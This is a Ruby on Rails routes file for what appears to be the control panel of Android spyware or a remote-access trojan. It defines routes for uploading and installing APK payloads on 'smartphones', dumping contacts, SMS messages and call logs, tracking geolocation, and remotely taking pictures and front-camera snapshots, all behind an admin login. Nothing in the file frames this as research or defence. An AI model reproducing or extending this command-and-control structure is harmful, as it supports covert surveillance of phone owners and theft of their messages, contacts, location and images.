Rails.application.routes.draw do
  resources :apk_installations
  resources :apk_payloads
  resources :contacts do
    collection do
        post :dump_contacts
    end
end
  resources :geo_locations
  resources :sms_messages do
    collection do
        post :dump_messages
    end
end
  resources :call_logs do
    collection do
        post :dump_calllogs
    end
end
  resources :recordings
  resources :videos
  resources :screenshots
  resources :pictures do
    collection do
        post :take_picture
    end
end

  resources :smartphones do
    collection do
        get :load
        post :install 
        post :front_camera_snap
        post :select_smartphone
        post :take_picture
        post :system_info
    end
  end
  
  devise_for :admin_users, ActiveAdmin::Devise.config
  ActiveAdmin.routes(self)
  # For details on the DSL available within this file, see https://guides.rubyonrails.org/routing.html
 

end

